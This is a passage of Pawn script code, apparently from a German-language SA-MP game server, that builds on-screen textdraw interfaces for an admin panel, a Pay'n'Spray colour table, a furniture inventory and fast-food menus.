	TextDrawSetOutline(AdminPanel[14], 0);
	TextDrawSetProportional(AdminPanel[14], 1);
	TextDrawSetShadow(AdminPanel[14], 1);
	TextDrawUseBox(AdminPanel[14], 1);
	TextDrawBoxColor(AdminPanel[14], 65535);
	TextDrawTextSize(AdminPanel[14], 431.000000, 20.000000);
	TextDrawSetSelectable(AdminPanel[14],1);
	AdminPanel[15] = TextDrawCreate(424.000000, 50.000000, "X");
	TextDrawBackgroundColor(AdminPanel[15], 255);
	TextDrawFont(AdminPanel[15], 1);
	TextDrawLetterSize(AdminPanel[15], 0.609999, 2.200000);
	TextDrawColor(AdminPanel[15], -16776961);
	TextDrawSetOutline(AdminPanel[15], 0);
	TextDrawSetProportional(AdminPanel[15], 1);
	TextDrawSetShadow(AdminPanel[15], 0);
	TextDrawSetSelectable(AdminPanel[15],1);
	AdminPanel[16] = TextDrawCreate(336.000000, 178.000000, "Timebann");
	TextDrawBackgroundColor(AdminPanel[16], 255);
	TextDrawFont(AdminPanel[16], 1);
	TextDrawLetterSize(AdminPanel[16], 0.480000, 1.9001);
	TextDrawColor(AdminPanel[16], -1);
	TextDrawSetOutline(AdminPanel[16], 0);
	TextDrawSetProportional(AdminPanel[16], 1);
	TextDrawSetShadow(AdminPanel[16], 1);
	TextDrawUseBox(AdminPanel[16], 1);
	TextDrawBoxColor(AdminPanel[16], 65535);
	TextDrawTextSize(AdminPanel[16], 431.000000, 20.000000);
	TextDrawSetSelectable(AdminPanel[16],1);
	Farbtabelle_hintergrund = TextDrawCreate(386.000000, 127.000000, "_");
	TextDrawBackgroundColor(Farbtabelle_hintergrund, 255);
	TextDrawFont(Farbtabelle_hintergrund, 1);
	TextDrawLetterSize(Farbtabelle_hintergrund, 0.500000, 19.299997);
	TextDrawColor(Farbtabelle_hintergrund, -1);
	TextDrawSetOutline(Farbtabelle_hintergrund, 0);
	TextDrawSetProportional(Farbtabelle_hintergrund, 1);
	TextDrawSetShadow(Farbtabelle_hintergrund, 1);
	TextDrawUseBox(Farbtabelle_hintergrund, 1);
	TextDrawBoxColor(Farbtabelle_hintergrund, 136);
	TextDrawTextSize(Farbtabelle_hintergrund, 228.000000, 35.000000);
	new wert = 0;
	for(new x = 0; x < 8; x++)
	{
	    for(new y = 0; y < 8; y++)
	    {
			Farbtabelle[wert] = TextDrawCreate(250.000000+y*19, 130.000000+x*22, "_");
			TextDrawLetterSize(Farbtabelle[wert], 0.509999, 1.500000);
			TextDrawUseBox(Farbtabelle[wert], 1);
			TextDrawBoxColor(Farbtabelle[wert], PayNSprayFarben[wert][0]);
			TextDrawTextSize(Farbtabelle[wert], 231.000000+y*19, 0.000000);
			TextDrawSetProportional(Farbtabelle[wert], 1);
			TextDrawFont(Farbtabelle[wert], 1);
			wert++;
		}
	}
	MoebelInv[0] = TextDrawCreate(553.000000, 102.000000, "_");
	TextDrawBackgroundColor(MoebelInv[0], 255);
	TextDrawFont(MoebelInv[0], 1);
	TextDrawLetterSize(MoebelInv[0], 0.500000, 0.000000);
	TextDrawColor(MoebelInv[0], -1);
	TextDrawSetOutline(MoebelInv[0], 0);
	TextDrawSetProportional(MoebelInv[0], 1);
	TextDrawSetShadow(MoebelInv[0], 1);
	TextDrawUseBox(MoebelInv[0], 1);
	TextDrawBoxColor(MoebelInv[0], 255);
	TextDrawTextSize(MoebelInv[0], 101.000000, 0.000000);
	MoebelInv[1] = TextDrawCreate(553.000000, 181.000000, "_");
	TextDrawBackgroundColor(MoebelInv[1], 255);
	TextDrawFont(MoebelInv[1], 1);
	TextDrawLetterSize(MoebelInv[1], 0.500000, 0.000000);
	TextDrawColor(MoebelInv[1], -1);
	TextDrawSetOutline(MoebelInv[1], 0);
	TextDrawSetProportional(MoebelInv[1], 1);
	TextDrawSetShadow(MoebelInv[1], 1);
	TextDrawUseBox(MoebelInv[1], 1);
	TextDrawBoxColor(MoebelInv[1], 255);
	TextDrawTextSize(MoebelInv[1], 101.000000, 0.000000);
	MoebelInv[2] = TextDrawCreate(553.000000, 260.000000, "_");
	TextDrawBackgroundColor(MoebelInv[2], 255);
	TextDrawFont(MoebelInv[2], 1);
	TextDrawLetterSize(MoebelInv[2], 0.500000, 0.000000);
	TextDrawColor(MoebelInv[2], -1);
	TextDrawSetOutline(MoebelInv[2], 0);
	TextDrawSetProportional(MoebelInv[2], 1);
	TextDrawSetShadow(MoebelInv[2], 1);
	TextDrawUseBox(MoebelInv[2], 1);
	TextDrawBoxColor(MoebelInv[2], 255);
	TextDrawTextSize(MoebelInv[2], 101.000000, 0.000000);
	MoebelInv[3] = TextDrawCreate(553.000000, 339.000000, "_");
	TextDrawBackgroundColor(MoebelInv[3], 255);
	TextDrawFont(MoebelInv[3], 1);
	TextDrawLetterSize(MoebelInv[3], 0.500000, 0.000000);
	TextDrawColor(MoebelInv[3], -1);
	TextDrawSetOutline(MoebelInv[3], 0);
	TextDrawSetProportional(MoebelInv[3], 1);
	TextDrawSetShadow(MoebelInv[3], 1);
	TextDrawUseBox(MoebelInv[3], 1);
	TextDrawBoxColor(MoebelInv[3], 255);
	TextDrawTextSize(MoebelInv[3], 101.000000, 0.000000);
	MoebelInv[4] = TextDrawCreate(108.000000, 105.000000, "_");
	TextDrawBackgroundColor(MoebelInv[4], 255);
	TextDrawFont(MoebelInv[4], 1);
	TextDrawLetterSize(MoebelInv[4], 0.500000, 25.600006);
	TextDrawColor(MoebelInv[4], -1);
	TextDrawSetOutline(MoebelInv[4], 0);
	TextDrawSetProportional(MoebelInv[4], 1);
	TextDrawSetShadow(MoebelInv[4], 1);
	TextDrawUseBox(MoebelInv[4], 1);
	TextDrawBoxColor(MoebelInv[4], 255);
	TextDrawTextSize(MoebelInv[4], 101.000000, 0.000000);
	MoebelInv[5] = TextDrawCreate(256.000000, 105.000000, "_");
	TextDrawBackgroundColor(MoebelInv[5], 255);
	TextDrawFont(MoebelInv[5], 1);
	TextDrawLetterSize(MoebelInv[5], 0.500000, 25.600006);
	TextDrawColor(MoebelInv[5], -1);
	TextDrawSetOutline(MoebelInv[5], 0);
	TextDrawSetProportional(MoebelInv[5], 1);
	TextDrawSetShadow(MoebelInv[5], 1);
	TextDrawUseBox(MoebelInv[5], 1);
	TextDrawBoxColor(MoebelInv[5], 255);
	TextDrawTextSize(MoebelInv[5], 249.000000, 0.000000);
	MoebelInv[6] = TextDrawCreate(553.000000, 105.000000, "_");
	TextDrawBackgroundColor(MoebelInv[6], 255);
	TextDrawFont(MoebelInv[6], 1);
	TextDrawLetterSize(MoebelInv[6], 0.500000, 25.600006);
	TextDrawColor(MoebelInv[6], -1);
	TextDrawSetOutline(MoebelInv[6], 0);
	TextDrawSetProportional(MoebelInv[6], 1);
	TextDrawSetShadow(MoebelInv[6], 1);
	TextDrawUseBox(MoebelInv[6], 1);
	TextDrawBoxColor(MoebelInv[6], 255);
	TextDrawTextSize(MoebelInv[6], 545.000000, 10.000000);
	MoebelInv[7] = TextDrawCreate(405.000000, 105.000000, "_");
	TextDrawBackgroundColor(MoebelInv[7], 255);
	TextDrawFont(MoebelInv[7], 1);
	TextDrawLetterSize(MoebelInv[7], 0.500000, 25.600006);
	TextDrawColor(MoebelInv[7], -1);
	TextDrawSetOutline(MoebelInv[7], 0);
	TextDrawSetProportional(MoebelInv[7], 1);
	TextDrawSetShadow(MoebelInv[7], 1);
	TextDrawUseBox(MoebelInv[7], 1);
	TextDrawBoxColor(MoebelInv[7], 255);
	TextDrawTextSize(MoebelInv[7], 398.000000, 0.000000);
	MoebelInv[8] = TextDrawCreate(47.000000, 189.000000, "pcbtns:left");
	TextDrawBackgroundColor(MoebelInv[8], 255);
	TextDrawFont(MoebelInv[8], 4);
	TextDrawLetterSize(MoebelInv[8], 0.500000, 1.000000);
	TextDrawColor(MoebelInv[8], 255);
	TextDrawSetOutline(MoebelInv[8], 0);
	TextDrawSetProportional(MoebelInv[8], 1);
	TextDrawSetShadow(MoebelInv[8], 1);
	TextDrawUseBox(MoebelInv[8], 1);
	TextDrawBoxColor(MoebelInv[8], 255);
	TextDrawTextSize(MoebelInv[8], 58.000000, 52.000000);
	TextDrawSetSelectable(MoebelInv[8],1);

	MoebelInv[9] = TextDrawCreate(551.000000, 189.000000, "pcbtns:right");
	TextDrawBackgroundColor(MoebelInv[9], 255);
	TextDrawFont(MoebelInv[9], 4);
	TextDrawLetterSize(MoebelInv[9], 0.500000, 1.000000);
	TextDrawColor(MoebelInv[9], 255);
	TextDrawSetOutline(MoebelInv[9], 0);
	TextDrawSetProportional(MoebelInv[9], 1);
	TextDrawSetShadow(MoebelInv[9], 1);
	TextDrawUseBox(MoebelInv[9], 1);
	TextDrawBoxColor(MoebelInv[9], 255);
	TextDrawTextSize(MoebelInv[9], 58.000000, 52.000000);
	TextDrawSetSelectable(MoebelInv[9],1);


	MoebelInv[10] = TextDrawCreate(108.000000, 105.000000, "_");
	TextDrawBackgroundColor(MoebelInv[10], 255);
	TextDrawFont(MoebelInv[10], 1);
	TextDrawLetterSize(MoebelInv[10], 0.500000, 8.099999);
	TextDrawUseBox(MoebelInv[10], 1);
	TextDrawBoxColor(MoebelInv[10], 0xFFFFFF00);
	TextDrawTextSize(MoebelInv[10], 249.000000, 85.00000);
	TextDrawSetSelectable(MoebelInv[10],1);
	MoebelInv[11] = TextDrawCreate(256.000000, 105.000000, "_");
	TextDrawBackgroundColor(MoebelInv[11], 255);
	TextDrawFont(MoebelInv[11], 1);
	TextDrawLetterSize(MoebelInv[11], 0.500000, 8.099999);
	TextDrawColor(MoebelInv[11], -1);
	TextDrawSetProportional(MoebelInv[11], 1);
	TextDrawUseBox(MoebelInv[11], 1);
	TextDrawBoxColor(MoebelInv[11], 0xFFFFFF00);
	TextDrawTextSize(MoebelInv[11], 398.000000, 85.00000);
	TextDrawSetSelectable(MoebelInv[11],1);
	MoebelInv[12] = TextDrawCreate(405.000000, 105.000000, "_");
	TextDrawBackgroundColor(MoebelInv[12], 255);
	TextDrawFont(MoebelInv[12], 1);
	TextDrawLetterSize(MoebelInv[12], 0.500000, 8.099999);
	TextDrawColor(MoebelInv[12], -1);
	TextDrawSetOutline(MoebelInv[12], 0);
	TextDrawSetProportional(MoebelInv[12], 1);
	TextDrawSetShadow(MoebelInv[12], 1);
	TextDrawUseBox(MoebelInv[12], 1);
	TextDrawBoxColor(MoebelInv[12], 0xFFFFFF00);
	TextDrawTextSize(MoebelInv[12], 546.000000, 85.00000);
	TextDrawSetSelectable(MoebelInv[12],1);
	MoebelInv[13] = TextDrawCreate(108.000000, 184.000000, "_");
	TextDrawBackgroundColor(MoebelInv[13], 255);
	TextDrawFont(MoebelInv[13], 1);
	TextDrawLetterSize(MoebelInv[13], 0.500000, 8.099999);
	TextDrawColor(MoebelInv[13], -1);
	TextDrawSetOutline(MoebelInv[13], 0);
	TextDrawSetProportional(MoebelInv[13], 1);
	TextDrawSetShadow(MoebelInv[13], 1);
	TextDrawUseBox(MoebelInv[13], 1);
	TextDrawBoxColor(MoebelInv[13], 0xFFFFFF00);
	TextDrawTextSize(MoebelInv[13], 249.000000, 85.00000);
	TextDrawSetSelectable(MoebelInv[13], 1);
	MoebelInv[14] = TextDrawCreate(256.000000, 184.000000, "_");
	TextDrawBackgroundColor(MoebelInv[14], 255);
	TextDrawFont(MoebelInv[14], 1);
	TextDrawLetterSize(MoebelInv[14], 0.500000, 8.099999);
	TextDrawColor(MoebelInv[14], -1);
	TextDrawSetProportional(MoebelInv[14], 1);
	TextDrawUseBox(MoebelInv[14], 1);
	TextDrawBoxColor(MoebelInv[14], 0xFFFFFF00);
	TextDrawTextSize(MoebelInv[14], 398.000000, 85.000000);
	TextDrawSetSelectable(MoebelInv[14],1);
	MoebelInv[15] = TextDrawCreate(405.000000, 184.000000, "_");
	TextDrawBackgroundColor(MoebelInv[15], 255);
	TextDrawFont(MoebelInv[15], 1);
	TextDrawLetterSize(MoebelInv[15], 0.500000, 8.099999);
	TextDrawColor(MoebelInv[15], -1);
	TextDrawSetProportional(MoebelInv[15], 1);
	TextDrawUseBox(MoebelInv[15], 1);
	TextDrawBoxColor(MoebelInv[15], 0xFFFFFF00);
	TextDrawTextSize(MoebelInv[15], 546.000000, 85.00000);
	TextDrawSetSelectable(MoebelInv[15],1);
	MoebelInv[16] = TextDrawCreate(108.000000, 263.000000, "_");
	TextDrawBackgroundColor(MoebelInv[16], 255);
	TextDrawFont(MoebelInv[16], 1);
	TextDrawLetterSize(MoebelInv[16], 0.500000, 8.099999);
	TextDrawColor(MoebelInv[16], -1);
	TextDrawSetOutline(MoebelInv[16], 0);
	TextDrawSetProportional(MoebelInv[16], 1);
	TextDrawSetShadow(MoebelInv[16], 1);
	TextDrawUseBox(MoebelInv[16], 1);
	TextDrawBoxColor(MoebelInv[16], 0xFFFFFF00);
	TextDrawTextSize(MoebelInv[16], 249.000000, 85.00000);
	TextDrawSetSelectable(MoebelInv[16],1);
	MoebelInv[17] = TextDrawCreate(256.000000, 263.000000, "_");
	TextDrawBackgroundColor(MoebelInv[17], 255);
	TextDrawFont(MoebelInv[17], 1);
	TextDrawLetterSize(MoebelInv[17], 0.500000, 8.099999);
	TextDrawColor(MoebelInv[17], -1);
	TextDrawSetOutline(MoebelInv[17], 0);
	TextDrawSetProportional(MoebelInv[17], 1);
	TextDrawSetShadow(MoebelInv[17], 1);
	TextDrawUseBox(MoebelInv[17], 1);
	TextDrawBoxColor(MoebelInv[17], 0xFFFFFF00);
	TextDrawTextSize(MoebelInv[17], 398.000000, 85.00000);
	TextDrawSetSelectable(MoebelInv[17],1);
	MoebelInv[18] = TextDrawCreate(405.000000, 263.000000, "_");
	TextDrawBackgroundColor(MoebelInv[18], 255);
	TextDrawFont(MoebelInv[18], 1);
	TextDrawLetterSize(MoebelInv[18], 0.500000, 8.099999);
	TextDrawColor(MoebelInv[18], -1);
	TextDrawSetOutline(MoebelInv[18], 0);
	TextDrawSetProportional(MoebelInv[18], 1);
	TextDrawSetShadow(MoebelInv[18], 1);
	TextDrawUseBox(MoebelInv[18], 1);
	TextDrawBoxColor(MoebelInv[18], 0xFFFFFF00);
	TextDrawTextSize(MoebelInv[18], 545.000000, 85.00000);
	TextDrawSetSelectable(MoebelInv[18],1);
	MoebelInv[19] = TextDrawCreate(471.000000, 340.000000, "Schliessen");
	TextDrawBackgroundColor(MoebelInv[19], 255);
	TextDrawFont(MoebelInv[19], 1);
	TextDrawLetterSize(MoebelInv[19], 0.500000, 1.200000);
	TextDrawColor(MoebelInv[19], -1);
	TextDrawSetOutline(MoebelInv[19], 0);
	TextDrawSetProportional(MoebelInv[19], 1);
	TextDrawSetShadow(MoebelInv[19], 1);
	TextDrawUseBox(MoebelInv[19], 1);
	TextDrawBoxColor(MoebelInv[19], 255);
	TextDrawTextSize(MoebelInv[19], 550.500000, 10.000000);
	TextDrawSetSelectable(MoebelInv[19],1);

	EssenPizza[0] = TextDrawCreate(491.000000, 141.000000, "_");
	TextDrawBackgroundColor(EssenPizza[0], 255);
	TextDrawFont(EssenPizza[0], 1);
	TextDrawLetterSize(EssenPizza[0], 0.500000, 18.600000);
	TextDrawColor(EssenPizza[0], -1);
	TextDrawSetOutline(EssenPizza[0], 0);
	TextDrawSetProportional(EssenPizza[0], 1);
	TextDrawSetShadow(EssenPizza[0], 1);
	TextDrawUseBox(EssenPizza[0], 1);
	TextDrawBoxColor(EssenPizza[0], 150);
	TextDrawTextSize(EssenPizza[0], 171.000000, 0.000000);
	EssenPizza[1] = TextDrawCreate(290.000000, 143.000000, "Burger Shot");
	TextDrawBackgroundColor(EssenPizza[1], 255);
	TextDrawFont(EssenPizza[1], 0);
	TextDrawLetterSize(EssenPizza[1], 0.599999, 2.399998);
	TextDrawColor(EssenPizza[1], -1);
	TextDrawSetOutline(EssenPizza[1], 0);
	TextDrawSetProportional(EssenPizza[1], 1);
	TextDrawSetShadow(EssenPizza[1], 1);
	EssenPizza[2] = TextDrawCreate(184.000000, 173.000000, "Pizza Margharita");
	TextDrawBackgroundColor(EssenPizza[2], 255);
	TextDrawFont(EssenPizza[2], 2);
	TextDrawLetterSize(EssenPizza[2], 0.359999, 2.200000);
	TextDrawColor(EssenPizza[2], -1);
	TextDrawSetOutline(EssenPizza[2], 0);
	TextDrawSetProportional(EssenPizza[2], 1);
	TextDrawSetShadow(EssenPizza[2], 1);
	TextDrawSetSelectable(EssenPizza[2], 1);
	TextDrawUseBox(EssenPizza[2], 1);
	TextDrawBoxColor(EssenPizza[2], 0xFFFFFF00);
	TextDrawTextSize(EssenPizza[2], 338.000000, 20.00000);
	EssenPizza[3] = TextDrawCreate(184.000000, 197.000000, "Pizza Salami");
	TextDrawBackgroundColor(EssenPizza[3], 255);
	TextDrawFont(EssenPizza[3], 2);
	TextDrawLetterSize(EssenPizza[3], 0.359999, 2.200000);
	TextDrawColor(EssenPizza[3], -1);
	TextDrawSetOutline(EssenPizza[3], 0);
	TextDrawSetProportional(EssenPizza[3], 1);
	TextDrawSetShadow(EssenPizza[3], 1);
	TextDrawSetSelectable(EssenPizza[3], 1);
	TextDrawUseBox(EssenPizza[3], 1);
	TextDrawBoxColor(EssenPizza[3], 0xFFFFFF00);
	TextDrawTextSize(EssenPizza[3], 338.000000, 20.00000);
	EssenPizza[4] = TextDrawCreate(184.000000, 224.000000, "Pizza Schinken");
	TextDrawBackgroundColor(EssenPizza[4], 255);
	TextDrawFont(EssenPizza[4], 2);
	TextDrawLetterSize(EssenPizza[4], 0.359999, 2.200000);
	TextDrawColor(EssenPizza[4], -1);
	TextDrawSetOutline(EssenPizza[4], 0);
	TextDrawSetProportional(EssenPizza[4], 1);
	TextDrawSetShadow(EssenPizza[4], 1);
    TextDrawSetSelectable(EssenPizza[4], 1);
    TextDrawUseBox(EssenPizza[4], 1);
	TextDrawBoxColor(EssenPizza[4], 0xFFFFFF00);
	TextDrawTextSize(EssenPizza[4], 338.000000, 20.00000);
	EssenPizza[5] = TextDrawCreate(184.000000, 251.000000, "Pizza Hawaii");
	TextDrawBackgroundColor(EssenPizza[5], 255);
	TextDrawFont(EssenPizza[5], 2);
	TextDrawLetterSize(EssenPizza[5], 0.359999, 2.200000);
	TextDrawColor(EssenPizza[5], -1);
	TextDrawSetOutline(EssenPizza[5], 0);
	TextDrawSetProportional(EssenPizza[5], 1);
	TextDrawSetShadow(EssenPizza[5], 1);
    TextDrawSetSelectable(EssenPizza[5], 1);
    TextDrawUseBox(EssenPizza[5], 1);
	TextDrawBoxColor(EssenPizza[5], 0xFFFFFF00);
	TextDrawTextSize(EssenPizza[5], 338.000000, 20.00000);
	EssenPizza[6] = TextDrawCreate(184.000000, 276.000000, "Pizza Thunfisch");
	TextDrawBackgroundColor(EssenPizza[6], 255);
	TextDrawFont(EssenPizza[6], 2);
	TextDrawLetterSize(EssenPizza[6], 0.359999, 2.200000);
	TextDrawColor(EssenPizza[6], -1);
	TextDrawSetOutline(EssenPizza[6], 0);
	TextDrawSetProportional(EssenPizza[6], 1);
	TextDrawSetShadow(EssenPizza[6], 1);
    TextDrawSetSelectable(EssenPizza[6], 1);
    TextDrawUseBox(EssenPizza[6], 1);
	TextDrawBoxColor(EssenPizza[6], 0xFFFFFF00);
	TextDrawTextSize(EssenPizza[6], 338.000000, 20.00000);
	EssenPizza[7] = TextDrawCreate(427.000000, 173.000000, "Salat");
	TextDrawBackgroundColor(EssenPizza[7], 255);
	TextDrawFont(EssenPizza[7], 2);
	TextDrawLetterSize(EssenPizza[7], 0.359999, 2.200000);
	TextDrawColor(EssenPizza[7], -1);
	TextDrawSetOutline(EssenPizza[7], 0);
	TextDrawSetProportional(EssenPizza[7], 1);
	TextDrawSetShadow(EssenPizza[7], 1);
    TextDrawSetSelectable(EssenPizza[7], 1);
    TextDrawUseBox(EssenPizza[7], 1);
	TextDrawBoxColor(EssenPizza[7], 0xFFFFFF00);
	TextDrawTextSize(EssenPizza[7], 487.000000, 20.000000);
	EssenPizza[8] = TextDrawCreate(349.000000, 197.000000, "Portion Pommes");
	TextDrawBackgroundColor(EssenPizza[8], 255);
	TextDrawFont(EssenPizza[8], 2);
	TextDrawLetterSize(EssenPizza[8], 0.359999, 2.200000);
	TextDrawColor(EssenPizza[8], -1);
	TextDrawSetOutline(EssenPizza[8], 0);
	TextDrawSetProportional(EssenPizza[8], 1);
	TextDrawSetShadow(EssenPizza[8], 1);
    TextDrawSetSelectable(EssenPizza[8], 1);
    TextDrawUseBox(EssenPizza[8], 1);
	TextDrawBoxColor(EssenPizza[8], 0xFFFFFF00);
	TextDrawTextSize(EssenPizza[8], 487.000000, 20.000000);
	EssenPizza[9] = TextDrawCreate(360.000000, 224.000000, "Riesen Pommes");
	TextDrawBackgroundColor(EssenPizza[9], 255);
	TextDrawFont(EssenPizza[9], 2);
	TextDrawLetterSize(EssenPizza[9], 0.359999, 2.200000);
	TextDrawColor(EssenPizza[9], -1);
	TextDrawSetOutline(EssenPizza[9], 0);
	TextDrawSetProportional(EssenPizza[9], 1);
	TextDrawSetShadow(EssenPizza[9], 1);
    TextDrawSetSelectable(EssenPizza[9], 1);
    TextDrawUseBox(EssenPizza[9], 1);
	TextDrawBoxColor(EssenPizza[9], 0xFFFFFF00);
	TextDrawTextSize(EssenPizza[9], 487.000000, 20.000000);
	EssenPizza[10] = TextDrawCreate(386.000000, 251.000000, "Softdrinks");
	TextDrawBackgroundColor(EssenPizza[10], 255);
	TextDrawFont(EssenPizza[10], 2);
	TextDrawLetterSize(EssenPizza[10], 0.359999, 2.200000);
	TextDrawColor(EssenPizza[10], -1);
	TextDrawSetOutline(EssenPizza[10], 0);
	TextDrawSetProportional(EssenPizza[10], 1);
	TextDrawSetShadow(EssenPizza[10], 1);
    TextDrawSetSelectable(EssenPizza[10], 1);
    TextDrawUseBox(EssenPizza[10], 1);
	TextDrawBoxColor(EssenPizza[10], 0xFFFFFF00);
	TextDrawTextSize(EssenPizza[10], 487.000000, 20.000000);
	EssenPizza[11] = TextDrawCreate(415.000000, 276.000000, "Wasser");
	TextDrawBackgroundColor(EssenPizza[11], 255);
	TextDrawFont(EssenPizza[11], 2);
	TextDrawLetterSize(EssenPizza[11], 0.359999, 2.200000);
	TextDrawColor(EssenPizza[11], -1);
	TextDrawSetOutline(EssenPizza[11], 0);
	TextDrawSetProportional(EssenPizza[11], 1);
	TextDrawSetShadow(EssenPizza[11], 1);
    TextDrawSetSelectable(EssenPizza[11], 1);
    TextDrawUseBox(EssenPizza[11], 1);
	TextDrawBoxColor(EssenPizza[11], 0xFFFFFF00);
	TextDrawTextSize(EssenPizza[11], 487.000000, 20.000000);


	EssensMenu[0] = TextDrawCreate(491.000000, 141.000000, "_");
	TextDrawBackgroundColor(EssensMenu[0], 255);
	TextDrawFont(EssensMenu[0], 1);
	TextDrawLetterSize(EssensMenu[0], 0.500000, 18.600000);
	TextDrawColor(EssensMenu[0], -1);
	TextDrawSetOutline(EssensMenu[0], 0);
	TextDrawSetProportional(EssensMenu[0], 1);
	TextDrawSetShadow(EssensMenu[0], 1);
	TextDrawUseBox(EssensMenu[0], 1);
	TextDrawBoxColor(EssensMenu[0], 150);
	TextDrawTextSize(EssensMenu[0], 171.000000, 0.000000);
	EssensMenu[1] = TextDrawCreate(290.000000, 143.000000, "Burger Shot");
	TextDrawBackgroundColor(EssensMenu[1], 255);
	TextDrawFont(EssensMenu[1], 0);
	TextDrawLetterSize(EssensMenu[1], 0.599999, 2.399998);
	TextDrawColor(EssensMenu[1], -1);
	TextDrawSetOutline(EssensMenu[1], 0);
	TextDrawSetProportional(EssensMenu[1], 1);
	TextDrawSetShadow(EssensMenu[1], 1);
	EssensMenu[2] = TextDrawCreate(184.000000, 173.000000, "Hamburger");
	TextDrawBackgroundColor(EssensMenu[2], 255);
	TextDrawFont(EssensMenu[2], 2);
	TextDrawLetterSize(EssensMenu[2], 0.359999, 2.200000);
	TextDrawColor(EssensMenu[2], -1);
	TextDrawSetOutline(EssensMenu[2], 0);
	TextDrawSetProportional(EssensMenu[2], 1);
	TextDrawSetShadow(EssensMenu[2], 1);
	TextDrawSetSelectable(EssensMenu[2], 1);
	TextDrawUseBox(EssensMenu[2], 1);
	TextDrawBoxColor(EssensMenu[2], 0xFFFFFF00);
	TextDrawTextSize(EssensMenu[2], 338.000000, 20.00000);
	EssensMenu[3] = TextDrawCreate(184.000000, 197.000000, "Cheesburger");
	TextDrawBackgroundColor(EssensMenu[3], 255);
	TextDrawFont(EssensMenu[3], 2);
	TextDrawLetterSize(EssensMenu[3], 0.359999, 2.200000);
	TextDrawColor(EssensMenu[3], -1);
	TextDrawSetOutline(EssensMenu[3], 0);
	TextDrawSetProportional(EssensMenu[3], 1);
	TextDrawSetShadow(EssensMenu[3], 1);
	TextDrawSetSelectable(EssensMenu[3], 1);
	TextDrawUseBox(EssensMenu[3], 1);
	TextDrawBoxColor(EssensMenu[3], 0xFFFFFF00);
	TextDrawTextSize(EssensMenu[3], 338.000000, 20.00000);
	EssensMenu[4] = TextDrawCreate(184.000000, 224.000000, "Chickenburger");
	TextDrawBackgroundColor(EssensMenu[4], 255);
	TextDrawFont(EssensMenu[4], 2);
	TextDrawLetterSize(EssensMenu[4], 0.359999, 2.200000);
	TextDrawColor(EssensMenu[4], -1);
	TextDrawSetOutline(EssensMenu[4], 0);
	TextDrawSetProportional(EssensMenu[4], 1);
	TextDrawSetShadow(EssensMenu[4], 1);
    TextDrawSetSelectable(EssensMenu[4], 1);
    TextDrawUseBox(EssensMenu[4], 1);
	TextDrawBoxColor(EssensMenu[4], 0xFFFFFF00);
	TextDrawTextSize(EssensMenu[4], 338.000000, 20.00000);
	EssensMenu[5] = TextDrawCreate(184.000000, 251.000000, "Chicken Nuggets");
	TextDrawBackgroundColor(EssensMenu[5], 255);
	TextDrawFont(EssensMenu[5], 2);
	TextDrawLetterSize(EssensMenu[5], 0.359999, 2.200000);
	TextDrawColor(EssensMenu[5], -1);
	TextDrawSetOutline(EssensMenu[5], 0);
	TextDrawSetProportional(EssensMenu[5], 1);
	TextDrawSetShadow(EssensMenu[5], 1);
    TextDrawSetSelectable(EssensMenu[5], 1);
    TextDrawUseBox(EssensMenu[5], 1);
	TextDrawBoxColor(EssensMenu[5], 0xFFFFFF00);
	TextDrawTextSize(EssensMenu[5], 338.000000, 20.00000);
	EssensMenu[6] = TextDrawCreate(184.000000, 276.000000, "Double Hamburger");
	TextDrawBackgroundColor(EssensMenu[6], 255);
	TextDrawFont(EssensMenu[6], 2);
	TextDrawLetterSize(EssensMenu[6], 0.359999, 2.200000);
	TextDrawColor(EssensMenu[6], -1);
	TextDrawSetOutline(EssensMenu[6], 0);
	TextDrawSetProportional(EssensMenu[6], 1);
	TextDrawSetShadow(EssensMenu[6], 1);
    TextDrawSetSelectable(EssensMenu[6], 1);
    TextDrawUseBox(EssensMenu[6], 1);
	TextDrawBoxColor(EssensMenu[6], 0xFFFFFF00);
	TextDrawTextSize(EssensMenu[6], 338.000000, 20.00000);
	EssensMenu[7] = TextDrawCreate(427.000000, 173.000000, "Salat");
	TextDrawBackgroundColor(EssensMenu[7], 255);
	TextDrawFont(EssensMenu[7], 2);
	TextDrawLetterSize(EssensMenu[7], 0.359999, 2.200000);
	TextDrawColor(EssensMenu[7], -1);
	TextDrawSetOutline(EssensMenu[7], 0);
	TextDrawSetProportional(EssensMenu[7], 1);
	TextDrawSetShadow(EssensMenu[7], 1);
    TextDrawSetSelectable(EssensMenu[7], 1);
    TextDrawUseBox(EssensMenu[7], 1);
	TextDrawBoxColor(EssensMenu[7], 0xFFFFFF00);
	TextDrawTextSize(EssensMenu[7], 487.000000, 20.000000);
	EssensMenu[8] = TextDrawCreate(349.000000, 197.000000, "Portion Pommes");
	TextDrawBackgroundColor(EssensMenu[8], 255);
	TextDrawFont(EssensMenu[8], 2);
	TextDrawLetterSize(EssensMenu[8], 0.359999, 2.200000);
	TextDrawColor(EssensMenu[8], -1);
	TextDrawSetOutline(EssensMenu[8], 0);
	TextDrawSetProportional(EssensMenu[8], 1);
	TextDrawSetShadow(EssensMenu[8], 1);
    TextDrawSetSelectable(EssensMenu[8], 1);
    TextDrawUseBox(EssensMenu[8], 1);
	TextDrawBoxColor(EssensMenu[8], 0xFFFFFF00);
	TextDrawTextSize(EssensMenu[8], 487.000000, 20.000000);
	EssensMenu[9] = TextDrawCreate(360.000000, 224.000000, "Riesen Pommes");
	TextDrawBackgroundColor(EssensMenu[9], 255);
	TextDrawFont(EssensMenu[9], 2);
	TextDrawLetterSize(EssensMenu[9], 0.359999, 2.200000);
	TextDrawColor(EssensMenu[9], -1);
	TextDrawSetOutline(EssensMenu[9], 0);
	TextDrawSetProportional(EssensMenu[9], 1);
	TextDrawSetShadow(EssensMenu[9], 1);
    TextDrawSetSelectable(EssensMenu[9], 1);
    TextDrawUseBox(EssensMenu[9], 1);
	TextDrawBoxColor(EssensMenu[9], 0xFFFFFF00);
	TextDrawTextSize(EssensMenu[9], 487.000000, 20.000000);
	EssensMenu[10] = TextDrawCreate(386.000000, 251.000000, "Softdrinks");
	TextDrawBackgroundColor(EssensMenu[10], 255);
	TextDrawFont(EssensMenu[10], 2);
	TextDrawLetterSize(EssensMenu[10], 0.359999, 2.200000);
	TextDrawColor(EssensMenu[10], -1);
	TextDrawSetOutline(EssensMenu[10], 0);
	TextDrawSetProportional(EssensMenu[10], 1);
	TextDrawSetShadow(EssensMenu[10], 1);
    TextDrawSetSelectable(EssensMenu[10], 1);
    TextDrawUseBox(EssensMenu[10], 1);
	TextDrawBoxColor(EssensMenu[10], 0xFFFFFF00);
	TextDrawTextSize(EssensMenu[10], 487.000000, 20.000000);
	EssensMenu[11] = TextDrawCreate(415.000000, 276.000000, "Wasser");
	TextDrawBackgroundColor(EssensMenu[11], 255);
